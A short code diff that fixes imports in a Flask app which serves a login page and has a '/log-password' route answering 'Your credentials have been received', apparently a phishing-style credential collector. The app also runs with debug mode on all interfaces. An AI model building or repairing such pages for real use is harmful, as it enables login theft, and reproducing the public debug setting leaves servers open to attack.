@@ -1,4 +1,5 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template, redirect, url_for, send_from_directory
+import os
 
 app = Flask(__name__)
 
@@ -8,7 +9,7 @@ def serve_login():
 
 @app.route('/banner.jpeg')
 def serve_image():
-    return send_from_directory('.', 'banner.jpeg')
+    return send_from_directory('.', 'banner.jpeg')
 
 @app.route('/log-password', methods=['POST'])
 def log_password():
@@ -19,6 +20,5 @@ def log_password():
     return "Thank you! Your credentials have been received."
 
 if __name__ == '__main__':
-    import os
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=True)
